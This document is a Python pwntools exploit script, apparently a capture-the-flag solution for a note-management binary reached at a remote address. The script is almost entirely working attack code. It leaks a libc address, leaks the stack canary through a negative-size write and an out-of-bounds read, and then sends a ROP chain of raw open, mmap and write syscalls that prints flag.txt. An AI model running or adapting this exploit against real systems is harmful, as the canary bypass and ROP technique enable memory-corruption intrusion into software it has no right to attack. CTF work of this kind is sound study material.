#!/usr/bin/env python3

from pwn import *
from ctypes import *
import time
import sys

local = 0
debug = 0

context.arch = 'amd64'
# context.aslr = False
# context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
# context.timeout = 2

def conn():
	global local
	global debug

	for arg in sys.argv[1:]:
		if arg in ('-h', '--help'):
			print('Usage: python ' + sys.argv[0] + ' <option> ...')
			print('Option:')
			print('        -h, --help:     Show help')
			print('        -l, --local:    Running on local')
			print('        -d, --debug:    Use gdb auto attach')
			exit(0)
		if arg in ('-l', '--local'):
			local = 1
		if arg in ('-d', '--debug'):
			debug = 1

	if local:
		s = process('./chall_patched')
		if debug:
			gdb.attach(s, gdbscript='''
            b* 0x0000000000401930
            b* 0x0000000000401953
            continue
			''')
		else:
			raw_input('DEBUG')
	else:
		s = remote('103.162.14.240', 15001)

	return s

s = conn()

elf = ELF('./chall_patched')
libc = ELF('libc.so.6')

pop_rax = 0x0000000000401491
pop_rdi = 0x000000000040148f
pop_rsi = 0x0000000000401493
pop_rsp = 0x00000000004014a0
pop_r10 = 0x0000000000401497
pop_r8 = 0x000000000040149a
pop_r9 = 0x000000000040149d
pop_rdx = 0x0000000000401495

sys_call = 0x00000000004014a8

# Stage 1 : Leak canary and Libc :
    
def create_note():
    s.sendlineafter(b'> ', b'1')

def write_note(idx, size=0x1000):
    s.sendlineafter(b'> ', b'2')
    s.sendlineafter(b'idx = ', str(idx).encode())
    s.sendlineafter(b'size to write = ', f"{size}".encode())
    
def read_note(idx):
    s.sendlineafter(b'> ', b'3')
    s.sendlineafter(b'idx = ', str(idx).encode())
    return s.recvline()

# Leak libc:
create_note()
s.recvline()
leak = int(s.recvuntil(b'000')[18:].decode(), 16)
libc.address = libc_base = leak - 4169728

log.info('libc_base : ' + hex(libc_base))

# Leak canary: 
for i in range(99):
    create_note()

write_note(17, size =-2**32 + 0x4000)
leak_2 = read_note(17)
leak_2 = b'\x00'+ leak_2[5993:5993+7]
leak_canary = u64(leak_2.ljust(8, b'\x00')) 
log.info('leak_canary : '+hex(leak_canary))

# mmap and input shellcode():
writeable = 0x404000

write_note(0, size=0x100)
s.sendline(b'flag.txt\x00')


payload = b'A'*24
payload += p64(leak_canary)
payload += p64(0)
payload += p64(pop_rdi)
payload += p64(leak)
payload += p64(pop_rax)
payload += p64(0x2)	
payload += p64(sys_call)
payload += p64(pop_rax)
payload += p64(0x9)
payload += p64(pop_rdi)
payload += p64(0x13370000)
payload += p64(pop_rsi)
payload += p64(0xffff)
payload += p64(pop_rdx)
payload += p64(7)
payload += p64(pop_r10)
payload += p64(0x02)
payload += p64(pop_r8)
payload += p64(3)
payload += p64(pop_r9)
payload += p64(0)
payload += p64(sys_call)
payload += p64(pop_rdi)
payload += p64(1)
payload += p64(pop_rsi)
payload += p64(0x13370000) 
payload += p64(pop_rax)
payload += p64(0x1)
payload += p64(pop_rdx)
payload += p64(0x20)
payload += p64(sys_call)


s.sendline(payload)
s.sendline(b'4')
s.interactive()




 
